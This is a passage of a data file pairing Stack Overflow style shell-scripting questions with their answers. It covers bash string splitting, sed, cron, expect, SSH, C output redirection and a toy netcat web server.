    "Split string into array in bash": "Introduction\nAt bottom of this, you will find a function to transform string to an array with following syntax:\nssplit \"<string>\" \"<array name>\" \"<delimiter string>\"\nFor this:\nssplit \"$c\" c_split $'\\n=======\\n'\ndeclare -p c_split \ndeclare -a c_split=([0]=$'AA=A\\nB=BB' [1]=$'C==CC\\nDD=D' [2]=$'EEE\\nFF')\nIFS disambiguation\nIFS mean Input Field Separators, as list of characters that could be used as separators.\nBy default, this is set to     \\t\\n, meaning that any number (greater than zero) of space, tabulation and/or newline could be one separator.\nSo with the string: $'    blah  foo=bar \\nbaz  '\n read -a c_split <<<\"    blah  foo=bar \n baz  \"\n declare -p c_split \n declare -a c_split=([0]=\"blah\" [1]=\"foo=bar\")\nLeading and trailing separators would be ignored and this string will contain only 3 parts: blah, foo=bar and baz.\nBut except for spaces, IFS consider each separator for itself:\nIFS=Z read a b c d e f <<<ZaZZbZcZZdZeZf\ndeclare -p a b c d e f\ndeclare -- a=\"\"\ndeclare -- b=\"a\"\ndeclare -- c=\"\"\ndeclare -- d=\"b\"\ndeclare -- e=\"c\"\ndeclare -- f=\"ZdZeZf\"\nSplitting a string using IFS is possible if you know a valid field separator not used in your string, so you could replace your pattern by this character (by using ${var//<pattern>/<separator>} syntax):\nOIFS=\"$IFS\"\nIFS='\u00a7'\nc=$'AA=A\\nB=BB\\n=======\\nC==CC\\nDD=D\\n=======\\nEEE\\nFF'\nc_split=(${c//=======/\u00a7})\nIFS=\"$OIFS\"\nprintf -- \"------ new part ------\\n%s\\n\" \"${c_split[@]}\"\n\n------ new part ------\nAA=A\nB=BB\n\n------ new part ------\n\nC==CC\nDD=D\n\n------ new part ------\n\nEEE\nFF\nBut this work only while string do not contain any \u00a7.\nYou could use another character, like IFS=$'\\026';c_split=(${c//=======/$'\\026'}) but anyway this may involve furter bugs.\nYou could browse character maps for finding one who's not in your string:\nmyIfs=\"\"\nfor i in {1..255};do\n    printf -v char \"$(printf \"\\\\\\%03o\" $i)\"\n        [ \"$c\" == \"${c#*$char}\" ] && myIfs=\"$char\" && break\n  done\nif ! [ \"$myIFS\" ] ;then\n    echo no split char found, could not do the job, sorry.\n    exit 1\n  fi\nbut I find this solution a little overkill.\nSplitting on spaces (or without modifying IFS)\nUnder\nbash\n, we could use this bashism:\nb=\"aaaaa/bbbbb/ddd/ffffff\"\nb_split=(${b//// })\nIn fact, this syntaxe ${varname// will initiate a translation (delimited by /) replacing all occurences of / by a space  , before assigning it to an array b_split.\nOf course, this still use IFS and split array on spaces.\nThis is not the best way, but could work with specific cases.\nYou could even drop unwanted spaces before splitting:\nb='12 34 / 1 3 5 7 / ab'\nb1=${b// }\nb_split=(${b1//// })\nprintf \"<%s>, \" \"${b_split[@]}\" ;echo\n<12>, <34>, <1>, <3>, <5>, <7>, <ab>, \nor exchange thems...\nb1=${b// /\u00a7}\nb_split=(${b1//// })\nprintf \"<%s>, \" \"${b_split[@]//\u00a7/ }\" ;echo\n<12 34 >, < 1 3 5 7 >, < ab>, \nSplitting line on delimiter strings:\nSo you have to not use IFS for your meaning, but\nbash\ndo have nice features:\n#!/bin/bash\n\nc=$'AA=A\\nB=BB\\n=======\\nC==CC\\nDD=D\\n=======\\nEEE\\nFF'\necho \"more complex string\"\necho \"$c\";\necho ;\necho \"split\";\n\nmySep='======='\nwhile [ \"$c\" != \"${c#*$mySep}\" ];do\n    echo \"------ new part ------\"\n    echo \"${c%%$mySep*}\"\n    c=\"${c#*$mySep}\"\n  done\necho \"------ last part ------\"\necho \"$c\"\nLet see:\nmore complex string\nAA=A\nB=BB\n=======\nC==CC\nDD=D\n=======\nEEE\nFF\n\nsplit\n------ new part ------\nAA=A\nB=BB\n\n------ new part ------\n\nC==CC\nDD=D\n\n------ last part ------\n\nEEE\nFF\nAbout Leading newline\nLeading and trailing newlines are not deleted in previous samples. For this, you could simply:\nmySep=$'\\n=======\\n'\ninstead of =======.\nOr you could rewrite split loop for keeping explicitely this out:\nmySep=$'======='\nwhile [ \"$c\" != \"${c#*$mySep}\" ];do\n    echo \"------ new part ------\"\n    part=\"${c%%$mySep*}\"\n    part=\"${part##$'\\n'}\"\n    echo \"${part%%$'\\n'}\"\n    c=\"${c#*$mySep}\"\n  done\necho \"------ last part ------\"\nc=${c##$'\\n'}\necho \"${c%%$'\\n'}\"\nAny case, this match what SO question asked for (: and his sample :)\n------ new part ------\nAA=A\nB=BB\n------ new part ------\nC==CC\nDD=D\n------ last part ------\nEEE\nFF\nFinaly creating an array.\n#!/bin/bash\nc=$'AA=A\\nB=BB\\n=======\\nC==CC\\nDD=D\\n=======\\nEEE\\nFF'\necho \"more complex string\"\necho \"$c\";\necho ;\necho \"split\";\n\nmySep=$'======='\nexport -a c_split\nwhile [ \"$c\" != \"${c#*$mySep}\" ];do\n    part=\"${c%%$mySep*}\"\n    part=\"${part##$'\\n'}\"\n    c_split+=(\"${part%%$'\\n'}\")\n    c=\"${c#*$mySep}\"\n  done\nc=${c##$'\\n'}\nc_split+=(\"${c%%$'\\n'}\")\n\nfor i in \"${c_split[@]}\"\ndo\n    echo \"------ new part ------\"\n    echo \"$i\"\ndone\nDo this finely:\nmore complex string\nAA=A\nB=BB\n=======\nC==CC\nDD=D\n=======\nEEE\nFF\n\nsplit\n------ new part ------\nAA=A\nB=BB\n------ new part ------\nC==CC\nDD=D\n------ new part ------\nEEE\nFF\nSome explanations:\nexport -a var to define var as an array and share them in childs\n${variablename%string*}, ${variablename%%string*} result in the left part of variablename, upto but without string. One % mean last occurence of string and %% for all occurences. Full variablename is returned is string not found.\n${variablename#*string}, do same in reverse way: return last part of variablename from but without string. One # mean first occurence and two ## man all occurences.\nNota in replacement, character * is a joker mean any number of any character.\nThe command echo \"${c%%$'\\n'}\" would echo variable c but without any number of newline at end of string.\nSo if variable contain Hello WorldZorGluBHello youZorGluBI'm happy,\nvariable=\"Hello WorldZorGluBHello youZorGluBI'm happy\"\n\n$ echo ${variable#*ZorGluB}\nHello youZorGlubI'm happy\n\n$ echo ${variable##*ZorGluB}\nI'm happy\n\n$ echo ${variable%ZorGluB*}\nHello WorldZorGluBHello you\n\n$ echo ${variable%%ZorGluB*}\nHello World\n\n$ echo ${variable%%ZorGluB}\nHello WorldZorGluBHello youZorGluBI'm happy\n\n$ echo ${variable%happy}\nHello WorldZorGluBHello youZorGluBI'm\n\n$ echo ${variable##* }\nhappy\nAll this is explained in the manpage:\n$ man -Len -Pless\\ +/##word bash\n\n$ man -Len -Pless\\ +/%%word bash\n\n$ man -Len -Pless\\ +/^\\\\\\ *export\\\\\\ .*word bash\nStep by step, the splitting loop:\nThe separator:\nmySep=$'======='\nDeclaring c_split as an array (and could be shared with childs)\nexport -a c_split\nWhile variable c do contain at least one occurence of mySep\nwhile [ \"$c\" != \"${c#*$mySep}\" ];do\nTrunc c from first mySep to end of string and assign to part.\n    part=\"${c%%$mySep*}\"\nRemove leading newlines\n    part=\"${part##$'\\n'}\"\nRemove trailing newlines and add result as a new array element to c_split.\n    c_split+=(\"${part%%$'\\n'}\")\nReassing c whith the rest of string when left upto mySep is removed\n    c=\"${c#*$mySep}\"\nDone ;-)\ndone\nRemove leading newlines\nc=${c##$'\\n'}\nRemove trailing newlines and add result as a new array element to c_split.\nc_split+=(\"${c%%$'\\n'}\")\nInto a function:\nssplit() {\n    local string=\"$1\" array=${2:-ssplited_array} delim=\"${3:- }\" pos=0\n    while [ \"$string\" != \"${string#*$delim}\" ];do\n        printf -v $array[pos++] \"%s\" \"${string%%$delim*}\"\n        string=\"${string#*$delim}\"\n      done\n    printf -v $array[pos] \"%s\" \"$string\"\n}\nUsage:\nssplit \"<quoted string>\" [array name] [delimiter string]\nwhere array name is $splitted_array by default and delimiter is one single space.\nYou could use:\nc=$'AA=A\\nB=BB\\n=======\\nC==CC\\nDD=D\\n=======\\nEEE\\nFF'\nssplit \"$c\" c_split $'\\n=======\\n'\nprintf -- \"--- part ----\\n%s\\n\" \"${c_split[@]}\"\n--- part ----\nAA=A\nB=BB\n--- part ----\nC==CC\nDD=D\n--- part ----\nEEE\nFF",
    "Copy text to the clipboard from the OS/X terminal": "Use pbcopy and pbpaste. Anything sent to pbcopy goes into the clipboard. Running pbpaste sends the contents of the clipboard to standard output and you can chain them just like all other commands.\nYou can find some example uses here: http://osxdaily.com/2007/03/05/manipulating-the-clipboard-from-the-command-line/",
    "basic shell programming": "Use sort and uniq\nsort a b | uniq -u\nIf you want the lines that are the same between A and B, you can use uniq -d\nsort a b | uniq -d\nThis assumes of course that the data in A and B are exactly the same. There cannot be any lose spaces or tabs in the datasets. If there are, you'll have to clean up the data with sed, tr, or awk first.\nEdit\nAs Peter. O pointed out, this will fail if there happen to be exact duplicates in file a. If that's an issue, you can fix it by doing this:\nsort <(sort -u a) b | uniq -u",
    "Shorter Scala Script header": "In Scala 2.11, you can do it as follows (exactly as with most other languages):\n#!/usr/bin/env scala\nprintln(args.mkString(\" \"))\nIn Scala 2.9.0.1, you can simply create the following script:\ntest.scala\n#!/usr/bin/scala\n!#\nprintln(args.mkString(\" \"))\nand make it executable. (change the first line to path to your executable)\nUsage:\n# ./test.scala Hello world!\nHello world!",
    "How to download folder artifact from artifactory": "A tip for non PRO users:\nThrough the GUI go to the repository path (e.g. http://artifactory.mycompany.com:8081/artifactory/list/libs-release-local/path/to/my/folder/\nUse the folder to recursively WGET the contents (e.g. wget -r --no-parent -nH --cut-dirs=4 --proxy=off http://artifactory.mycompany.com:8081/artifactory/list/libs-release-local/path/to/my/folder/)",
    "This command can only be used by root": "It's the second part of the command that needs to be executed as root.\nsudo wget -O - http://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add -\nNot super elegant, but it works :)",
    "How to check if curl was successful and print a message?": "You can use the -w (--write-out) option of curl to print the HTTP code:\ncurl -s -w '%{http_code}\\n' 'https://xxxx:1234xxxx@abc.dfghj.com/xl_template.get_web_query?id=1035066'\nIt will show the HTTP code the site returns.\nAlso curl provides a whole bunch of exit codes for various scenarios, check man curl.",
    "Read values from configuration file and use in shell script": "just:\nsource config.file\nthen you could use those variables in your shell.",
    "Put every N rows of input into a new column": "Using a little known gem pr:\n$ seq 20 | pr -ts' ' --column 4\n1 6 11 16\n2 7 12 17\n3 8 13 18\n4 9 14 19\n5 10 15 20",
    "Sed Insert Multiple Lines": "In a shell script, backslash+newline expands to nothing. It's a way to continue to the next line without actually having a newline in the string. So what sed sees is just one big line. Compare:\n$ echo \"foo\\\n> bar\"\nfoobar\n$ echo \"foo\n> bar\"\nfoo\nbar\nYou need to pass a backslash and a newline to sed, so escape the backslash by putting another backslash before it.\nsed -i \"${line} i\\\\\n        /* Name - ID */ \\\\\n        select  @ID = NULL \\\\\n        from    Animals \\\\\n        where   VrsnID = @VrsnID \\\\\n        and     Request= \\\"Request\\\" \\\\\n\n\" animalNames.txt\nThis may be more readable if you pass the script on the standard input as a here document. You need to leave expansion on to substitute ${line}, so you still need to double the backslash.\nsed -i -f - animalNames.txt <<EOF\n${line} i\\\\\n        /* Name - ID */ \\\\\n        select  @ID = NULL \\\\\n        from    Animals \\\\\n        where   VrsnID = @VrsnID \\\\\n        and     Request= \"Request\" \\\\\n\nEOF",
    "Replacing all GUIDs in a file with new GUIDs from the command line": "I rewrote the C# solution in PowerShell. I figured it would be easier for you to run a powershell script then compile a C# exe.\nSteps for using this:\nDownload/install powershell\nSave the code below somewhere, named GuidSwap.ps1\nModify the $filename and $outputFilename variables to suit your needs\nRun powershell -noexit c:\\location\\to\\guidswap.ps1\n## GuidSwap.ps1\n##\n## Reads a file, finds any GUIDs in the file, and swaps them for a NewGUID\n##\n\n$filename = \"d:\\test.txt\"\n$outputFilename = \"d:\\test_new.txt\"\n\n$text = [string]::join([environment]::newline, (get-content -path $filename))\n\n$sbNew = new-object system.text.stringBuilder\n\n$pattern = \"[a-fA-F0-9]{8}-([a-fA-F0-9]{4}-){3}[a-fA-F0-9]{12}\"\n\n$lastStart = 0\n$null = ([regex]::matches($text, $pattern) | %{\n    $sbNew.Append($text.Substring($lastStart, $_.Index - $lastStart))\n    $guid = [system.guid]::newguid()\n    $sbNew.Append($guid)\n    $lastStart = $_.Index + $_.Length\n})\n$null = $sbNew.Append($text.Substring($lastStart))\n\n$sbNew.ToString() | out-file -encoding ASCII $outputFilename\n\nWrite-Output \"Done\"",
    "Sending email using unix shell scripting": "You forgot the quotes:\necho $body | mail $receiver -s \"$subj\"\nNote that you must use double quotes (otherwise, the variable won't be expanded).\nNow the question is: Why double quotes around $subj and not $body or $receiver. The answer is that echo doesn't care about the number of arguments. So if $body expands to several words, echo will just print all of them with a single space in between. Here, the quotes would only matter if you wanted to preserve double spaces.\nAs for $receiver, this works because it expands only to a single word (no spaces). It would break for mail addresses like John Doe <doe@none.com>.",
    "Uses for this bash filename extraction technique?": "It gets rid of the filename extension (here: .tif), sample:\n$ for A in test.py test.sh test.xml test.xsl; do echo \"$A: ${A%%.*}\"; done\ntest.py: test\ntest.sh: test\ntest.xml: test\ntest.xsl: test\nfrom bash manual:\n   ${parameter%%word}\n          The word is expanded to produce a pattern just as in pathname expansion.  If the\n          pattern matches a trailing portion of the expanded value of parameter, then  the\n          result  of  the  expansion  is the expanded value of parameter with the shortest\n          matching pattern (the ``%'' case) or the longest matching  pattern  (the  ``%%''\n          case) deleted.  If parameter is @ or *, the pattern removal operation is applied\n          to each positional parameter in turn, and the expansion is the  resultant  list.\n          If  parameter  is an array variable subscripted with @ or *, the pattern removal\n          operation is applied to each member of the array in turn, and the  expansion  is\n          the resultant list.",
    "Converting a list of strings into a single line with sed/awk on linux": "I think this is what you're trying to do, using any awk:\n$ awk -v RS= -F'\\n' -v OFS=', ' '{$1=$1} 1' test.txt\nVal1, Val2, Val3\nVal4, Val5\nVal6",
    "Create a minimum REST Web Server with netcat nc": "I hacked the example given by @syme at \"https://stackoverflow.com/a/24342101/433814\" and created the one-liner REST server. Some headers are missing, but it correctly handles HTTP GET and 404 of non-implemented resources.\nrm -f out ; mkfifo out ; trap \"rm -f out\" EXIT ; while true ; do cat out | nc -l 1500 > >(export REQUEST= ; while read line ; do line=$(echo \"$line\" | tr -d '[\\r\\n]') ; if echo \"$line\" | grep -qE '^GET /' ; then REQUEST=$(echo \"$line\" | cut -d ' ' -f2) ; elif [ \"x$line\" = x ] ; then HTTP_200=\"HTTP/1.1 200 OK\" ; HTTP_LOCATION=\"Location:\" ; HTTP_404=\"HTTP/1.1 404 Not Found\" ; if echo $REQUEST | grep -qE '^/echo/' ; then printf \"%s\\n%s %s\\n\\n%s\\n\" \"$HTTP_200\" \"$HTTP_LOCATION\" $REQUEST ${REQUEST#\"/echo/\"} > out ; elif echo $REQUEST | grep -qE '^/date' ; then date > out ; elif echo $REQUEST | grep -qE '^/stats' ; then vmstat -S M > out ; elif echo $REQUEST | grep -qE '^/net' ; then ifconfig > out ; else printf \"%s\\n%s %s\\n\\n%s\\n\" \"$HTTP_404\" \"$HTTP_LOCATION\" $REQUEST \"Resource $REQUEST NOT FOUND!\" > out ; fi ; fi ; done) ; done\nThe formatted version is located at https://gist.github.com/marcellodesales/9e4288f35ac2cc3e1b83#file-formatted\nThe API above implements the following:\n/echo/{name}\nReturns the given {name}\n$ curl -i http://localhost:1500/echo/marcello\nHTTP/1.1 200 OK\nLocation: /echo/marcello\n\nmarcello\n/date\nReturns the server's date\n$ curl -i http://localhost:1500/date\nSun Oct 19 14:12:27 PDT 2014\n/stats\nReturns the server's stats\n$ curl -i http://localhost:1500/stats\nprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n 0  0     11    374    383   2198    0    0     6    22   33    8  2  2 97  0  0\n/net\nPrints the server's network\n$ curl -i http://localhost:1500/net\ndocker0   Link encap:Ethernet  HWaddr 56:84:7a:fe:97:99  \n          inet addr:172.17.42.1  Bcast:0.0.0.0  Mask:255.255.0.0\n          inet6 addr: fe80::5484:7aff:fefe:9799/64 Scope:Link\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:120694 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:141757 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:272911625 (272.9 MB)  TX bytes:289945068 (289.9 MB)\n\neth0      Link encap:Ethernet  HWaddr 00:0c:29:1f:d3:b5  \n          inet addr:192.168.248.206  Bcast:192.168.248.255  Mask:255.255.255.0\n          inet6 addr: fe80::20c:29ff:fe1f:d3b5/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:2322493 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:1098965 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:2367412677 (2.3 GB)  TX bytes:700548644 (700.5 MB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:151566 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:151566 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:305833574 (305.8 MB)  TX bytes:305833574 (305.8 MB)\n/ANYTHING/NOT/IMPLEMENTED\nFor anything that the server does not implement, it prints the 404 message.\n$ curl -i http://localhost:1500/wrong\nHTTP/1.1 404 Not Found\nLocation: /wrong\n\nResource /wrong NOT FOUND!\nHere's the formatted solution from the GIST above. You can save it as \"web.sh\" and run :)\nrm -f out\nmkfifo out\ntrap \"rm -f out\" EXIT\nwhile true\ndo\n  cat out | nc -l -p 1500 -q 1 > >( # parse the netcat output, to build the answer redirected to the pipe \"out\".\n    export REQUEST=\n    while read line\n    do\n      line=$(echo \"$line\" | tr -d '[\\r\\n]')\n \n      if echo \"$line\" | grep -qE '^GET /' # if line starts with \"GET /\"\n      then\n        REQUEST=$(echo \"$line\" | cut -d ' ' -f2) # extract the request\n      elif [ \"x$line\" = x ] # empty line / end of request\n      then\n        HTTP_200=\"HTTP/1.1 200 OK\"\n        HTTP_LOCATION=\"Location:\"\n        HTTP_404=\"HTTP/1.1 404 Not Found\"\n        # call a script here\n        # Note: REQUEST is exported, so the script can parse it (to answer 200/403/404 status code + content)\n        if echo $REQUEST | grep -qE '^/echo/'\n        then\n            printf \"%s\\n%s %s\\n\\n%s\\n\" \"$HTTP_200\" \"$HTTP_LOCATION\" $REQUEST ${REQUEST#\"/echo/\"} > out\n        elif echo $REQUEST | grep -qE '^/date'\n        then\n            date > out\n        elif echo $REQUEST | grep -qE '^/stats'\n        then\n            vmstat -S M > out\n        elif echo $REQUEST | grep -qE '^/net'\n        then\n            ifconfig > out\n        else\n            printf \"%s\\n%s %s\\n\\n%s\\n\" \"$HTTP_404\" \"$HTTP_LOCATION\" $REQUEST \"Resource $REQUEST NOT FOUND!\" > out\n        fi\n      fi\n    done\n  )\ndone",
    "Shell command to get color under mouse cursor (xorg)": "Not really satisfied with the other solution, I tried my ImageMagick idea. Works fine for me! (Depends on xclip, ImageMagick, xdotool, notify-send)\n#!/bin/sh\n# Get hex rgb color under mouse cursor, put it into clipboard and create a\n# notification.\n\neval $(xdotool getmouselocation --shell)\nIMAGE=`import -window root -depth 8 -crop 1x1+$X+$Y txt:-`\nCOLOR=`echo $IMAGE | grep -om1 '#\\w\\+'`\necho -n $COLOR | xclip -i -selection CLIPBOARD\nnotify-send \"Color under mouse cursor: \" $COLOR\nEDIT:\nNow using Gnome Shell, I have problems with the above solution (import won't take a screenshot of the visible windows, I don't know why. Hints are welcome). An alternative is to use a (fast) screenshot taker like scrot and use convert instead of import:\n#!/bin/sh\n# Get hex rgb color under mouse cursor, put it into clipboard and create a\n# notification.\n\nscrot --overwrite /tmp/copycolor.png\neval $(xdotool getmouselocation --shell)\nIMAGE=`convert /tmp/copycolor.png -depth 8 -crop 1x1+$X+$Y txt:-`\nCOLOR=`echo $IMAGE | grep -om1 '#\\w\\+'`\necho -n $COLOR | xclip -i -selection CLIPBOARD\nnotify-send \"Color under mouse cursor: \" $COLOR\nUpdate 2020: Newer versions of scrot require the \"--overwrite\" option to be set for this to work.",
    "How do I write a shell script that displays SQLite results?": "One common way to solve this problem is to use a shell feature called a here document, try this:\n sqlite3 /Users/user/Documents/Test/dbName.dba <<EOS\n     insert into myTable (Date, Details, Category, Average) \n               values(datetime('now','localtime'), '$1', '$2', '$3');\n\n     select \"Category1 total = \" sum(Average) from (\n          select * from myTable where Category = 'category1'\n     );\n\n     select \"Category2 total = \" sum(Average) from (\n         select * from myTable where Category = 'category2'\n     );\n\n EOS\nNote that EOS can be any string you like (I think of EndOfScript), but it must be alone on the last line of text with no trailing whitespace.\nAs I don't use sqlite3, you may need some statment to close off the batch that I'm not aware of. Also, I'm not certain that the '$1' stuff will work, if sqlite3 is forgiving, try \"$1\", etc instead. Also, you may need to an a comma after the \"CategoryN total = \" string.\nNote that this solution allows you to create your sql DML statements pretty much as big/long as you want. For stuff that will happen regularly and it ranging over large tables, if you have permissions on our system, you may want your DML to a stored procedure and call that.\nI hope this helps.\n(If this doesn't work, please edit your post to indicate shell you are using, OS/Linux Ver and a minimal version of error messages that you are getting).\nEdit: Note that if thru your development testing you go with 'EOS' quoting as mentioned in a comment below, the O.P.'s quoting ('\\'''$1''\\'') may still be appropriate depending on levels of shell nesting. Correct quoting of embedded code can be quite a project to get right )-;",
    "How does one create a script to execute multiple \"exec\" commands sequentially?": "You can to run all commands but the last in background, and the last with exec.\nFor example if you have 4 commands:\n#!/bin/bash\n\ncommand1 &\ncommand2 &\ncommand3 &\n\nexec command4\nProcesses tree before exec is executed:\nbash                         < your terminal\n  |\n  +----bash                  < the script\n         |\n         +------command1\n         |\n         +------command2\n         |\n         +------command3\nProcesses tree after exec is executed:\nbash                         < your terminal\n  |\n  +------command4\n            |\n            +------command1\n            |\n            +------command2\n            |\n            +------command3\nAs you see, the ownership of the first three commands is transferred to command4 when the bash process for the script is replaced by command4.\nNote:\nIf command4 exits before the other commands, processes tree becomes:\ninit                         < Unix init process (PID 1)\n  |\n  +------command1\n  |\n  +------command2\n  |\n  +------command3\nAlthough ownership should logically have been transferred to the bash terminal process? Unix mysteries.",
    "String comparison doesn't work": "You have to leave a space around the equal sign:\nif [ \"$A\" = \"$B\" ];\nthen\n  echo 'strings are equal' \nfi\nEdit: Please notice also the quotation marks around the variables. Without them you will get into trouble if one of them is empty.\nOtherwise the test is interpreted as test if the string \"foo=bar\" has a length>0.\nSee man test:\n   ...\n   STRING equivalent to -n STRING\n   -n STRING\n          the length of STRING is nonzero\n   ...",
    "Cron error with using backquotes": "Try it with $() instead of backticks. And you probably do need to escape the percent signs since cron converts them to newlines otherwise.\n* 0 * * * /usr/bin/mysqldump -uUser -pPass Db_name > /var/www/db_backup/db.$(date +\\%Y\\%m\\%d\\%H\\%M).sql\nAlso, you should store the password in an option file with secure permissions (eg. 600 or 640) instead of passing it on the command line.",
    "Why do I get this error using {1..9} in zsh?": "In zsh, if you want to use ranges in filenames, zle offers <1-n> on any real names it can expand on. That is to say:\n$ touch a0b a1b a5b a7b\n$ print a<0-100>b\nAnd then hit <Tab> right after the final b would leave you with print a0b a1b a5b a7b expanded on the line.\nFor all other intents and purposes - perhaps full range requirements, non-file and scripting use - I'd express this using the rather succinct idiomatic zsh loop as:\nfor n ({1..50}); do print $n; done\nWill allow you process the whole sequence range of numbers 1 to 50 :) after which you can do all sorts of useful things with, such as a file collection that doesn't exist yet:\narr=($(for n ({1..50}); do print /my/path/file$n.txt; done)) && print $arr[33]",
    "How to write if else in one line in shell?": "Space -- the final frontier. This works:\nif [ $SERVICESTATEID -eq 2 ]; then echo \"CRITICAL\"; else echo \"OK\"; fi\nNote spaces after [ and before ] -- [ is a command name! And I removed an extra $ at the end of $SERVICESTATEID.\nAn alternative is to spell out test. Then you don't need the final ], which is what I prefer:\nif test $SERVICESTATEID -eq 2; then echo \"CRITICAL\"; else echo \"OK\"; fi",
    "how to debug fish script?": "Fish use a similar flag system:\nfish -d 3 script.fish\nWhere d is the debug flag followed by the verbosity level:\n-d or --debug-level=DEBUG_LEVEL specify the verbosity level of fish. A higher number means higher verbosity. The default level is 1.",
    "curl command not executing via shell script in bash": "A command embedded within a parenthesis runs as a sub-shell so your environment variables will be missing.\nTry eval:\ncurlCmd=\"curl 'https://www.facebook.com/vivekkumar27june88' > ~/Desktop/fb.html\"\neval $curlCmd",
    "Change php.ini values from shell script": "",
    "Copy entire content from a folder to another in shell script": "None of these answers worked for me for recursive copy. Found this in a script in one of my libraries and thought I'd share it (with a subfolder example for both the source and destination, which is what I needed):\nSOURCE=\"/my/folder\"\nDESTINATION=\"/my/destination\"\n\ncp -r \"$SOURCE/subdir/\"* \"$DESTINATION/another_sub/\"\nWith this, every subfolder and every file was copied.\nI don't know why but the asterisk outside the quotes in the source did the magic for me (using bash 4.3.11 here)",
    "shell script to create folder daily with time-stamp and push time-stamp generated logs": "Maybe you are looking for a script like this:\n#!/bin/bash\n\nshopt -s nullglob  # This line is so that it does not complain when no logfiles are found\nfor filename in test*.log; do # Files considered are the ones starting with test and ending in .log\n    foldername=$(echo \"$filename\" | awk '{print (substr($0, 5, 8));}'); # The foldername is characters 5 to 13 from the filename (if they exist)\n    mkdir -p \"$foldername\"  # -p so that we don't get \"folder exists\" warning\n    mv \"$filename\" \"$foldername\"\n    echo \"$filename $foldername\" ;\ndone\nI only tested with your sample, so do a proper testing before using in a directory that contains important stuff.\nEdit in response to comments:\nChange your original script to this:\nfoldername=$(date +%Y%m%d)\nmkdir -p  /home/app/logs/\"$foldername\"\nsh sample.sh > /home/app/logs/\"$foldername\"/test$(date +%Y%m%d%H%M%S).log\nOr if the directory is created somewhere else, just do this:\nsh sample.sh > /home/app/logs/$(date +%Y%m%d)/test$(date +%Y%m%d%H%M%S).log",
    "Appending the contents of a file at the beginning of another file in UNIX [closed]": "Just do:\ncat file1 file2 > tmp && mv tmp file2",
    "Running script commands after SSH": "ssh $host 'command1; command2; command3'\nor if you have just one command:\nssh $host command1\nor if you have many commands (a script file):\ncat file | ssh $host sh",
    "Write to terminal after redirecting stdout to a file without using stderr?": "Open /dev/tty on another FD.\nexec 0< /dev/null\nexec 1> /dev/null\nexec 2> /dev/null\nexec 3> /dev/tty\necho 'Hello, World!' >&3 ",
    "expect script + how to ignore strings if not appears": "Set a timeout\nset timeout 10\nWill wait for the expected line for 10 seconds, and then move on to the next line in the script if not received within the specified timeout.\nReference http://linuxshellaccount.blogspot.com/2008/01/taking-look-at-expect-on-linux-and-unix.html\nUPDATE: If a timeout is not an acceptable solution you could try using a list of alternative responses to drive the script forward.\nexpect {\n \"(Are you sure you want to continue connecting yes/no)?\" { send \"yes\\r\"; exp_continue }\n password:                                                {send PASS123\\r; exp_continue}\n}",
    "redirecting output to a file in C": "This is the result of my testing things out with dup2\nThe more subtle point is remembering fflush at the right times :) Otherwise, you'll get very surprising results.\nAlso, prefer fileno instead of hardcoding 1 (stdout) 2 (stderr).\nRedirecting stdin was left as an exercise for the reader\n#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <unistd.h>\n\nint main(int argc, const char *argv[])\n{\n    int out = open(\"cout.log\", O_RDWR|O_CREAT|O_APPEND, 0600);\n    if (-1 == out) { perror(\"opening cout.log\"); return 255; }\n\n    int err = open(\"cerr.log\", O_RDWR|O_CREAT|O_APPEND, 0600);\n    if (-1 == err) { perror(\"opening cerr.log\"); return 255; }\n\n    int save_out = dup(fileno(stdout));\n    int save_err = dup(fileno(stderr));\n\n    if (-1 == dup2(out, fileno(stdout))) { perror(\"cannot redirect stdout\"); return 255; }\n    if (-1 == dup2(err, fileno(stderr))) { perror(\"cannot redirect stderr\"); return 255; }\n\n    puts(\"doing an ls or something now\");\n\n    fflush(stdout); close(out);\n    fflush(stderr); close(err);\n\n    dup2(save_out, fileno(stdout));\n    dup2(save_err, fileno(stderr));\n\n    close(save_out);\n    close(save_err);\n\n    puts(\"back to normal output\");\n\n    return 0;\n}",
    "shell script stop error": "Add the following to the top.\nset -e\nAfter executing that line, the shell will exit if any line returns an error code. set +e will turn this back off again (i.e. switch back to continuing regardless of any error return codes).\nSee http://www.davidpashley.com/articles/writing-robust-shell-scripts.html for further details.",
    "How do I get the name of the newest file via the Terminal?": "Since you're already using pipes, just throw another one in there:\nls -t | head -n1 |awk '{printf(\"newest file: %s\",$0)}'\n(Note that the \"printf\" does not include a '\\n' at the end; that gets rid of the linebreak)\nEdit:\nWith Arkku's suggestion to exit awk after the first line, it looks like:\nls -t | awk '{printf(\"newest file: %s\",$0);exit}'",
    "How to delete .htaccess file recursive based on size or content": "You can use find to go recursively through multiple directories, search for files and execute a command like rm on the result.\nfind . -type f -perm 0444 -name \".htaccess\" -exec echo rm {} \\;\n. current diretory / can be other path e.g. /etc\n-type f search for files\n-perm 0444 permission 0444\n-name \".htaccess\" will only look for files named .htaccess\n-exec CMD {} \\; run command like rm on the result {}\nverify output of find and remove echo to remove files",
    "PS1 env cannot parse on the new mac Catalina": "I came across this issue as well with a brand new Catalina machine. New models seem to default to zsh shell, instead of the traditional bash, to change this:\nGo to Users & Groups (unlock to make admin changes) right-click on your admin user, Advanced Options..., change Login shell to /bin/bash\nThis will allow you to utilize bash's prompt string parsing for a nicer prompt - as mac has traditionally supported in the past.",
    "How to check whether shell scripts / Vim running in VS Code integrated terminal?": "By examining the shell variables in the vscode terminal you can see that it sets TERM_PROGRAM=vscode. In my .bash_profile I have the following and it works great:\nif [ \"$TERM_PROGRAM\" == \"vscode\" ]; then\n    # some stuff\nelse\n    # other stuff\nfi",
